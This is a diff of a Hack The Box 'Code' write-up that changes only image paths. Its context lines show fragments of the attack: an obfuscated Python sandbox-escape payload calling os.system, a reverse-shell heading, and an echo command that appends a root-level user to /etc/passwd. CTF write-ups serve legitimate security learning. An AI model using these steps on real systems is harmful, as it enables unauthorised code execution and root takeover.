@@ -3,14 +3,14 @@ title: "Hackthebox Code Machine Write-up"
 date: 2025-04-22 10:00:00 +0000
 categories: [WriteUps, Hack The Box, Easy, Linux]
 tags: [RCE, PythonSandbox, PrivilegeEscalation, SQLite, PasswordCracking]
-image: /assets/img/writeups/htb-code/code.png
+image: /assets/img/writeups/htb/code.png
 ---
 
 Hello pentesters!
 
 Here is a write-up for the Hackthebox `Code` machine.
 
-![recon](/assets/img/writeups/htb-code/code.png)
+![recon](/assets/img/writeups/htb/code.png)
 
 Hackthebox `Code` is an easy Linux machine.
 
@@ -81,7 +81,7 @@ print.__self__.__dict__.get('__imp' +'ort__')('o'+'s').__getattribute__("sys"+"t
 
 ## Boom! Got Reverse Shell
 
-![recon](/assets/img/writeups/htb-code/get_reverse_shell.png)
+![recon](/assets/img/writeups/htb/get_reverse_shell.png)
 
 ```bash
 $ whoami
@@ -195,10 +195,10 @@ echo 'new-user:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> /et
 su new-user
 ```
 
-![recon](/assets/img/writeups/htb-code/root.png)
+![recon](/assets/img/writeups/htb/root.png)
 
 ## And We Own the Box
 
-![recon](/assets/img/writeups/htb-code/code_pwn.png)
+![recon](/assets/img/writeups/htb/code_pwn.png)
 
 ## Happy Hacking! @Top0n3
